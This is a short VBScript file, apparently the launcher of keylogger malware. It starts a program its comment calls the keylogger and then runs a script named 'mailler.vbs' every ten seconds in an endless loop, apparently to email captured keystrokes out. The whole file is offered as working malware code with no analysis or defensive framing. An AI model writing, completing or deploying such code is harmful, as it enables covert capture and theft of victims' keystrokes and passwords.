
Set shell=CreateObject("WScript.Shell") 'Sets the shell

shell.Run "system.exe" 'Starts the keylogger

do 'Start of loop
WScript.Sleep(10000) '(1000 is 1 second)
shell.Run "mailler.vbs" 'Starts mailler.vbs'
loop 'End of loop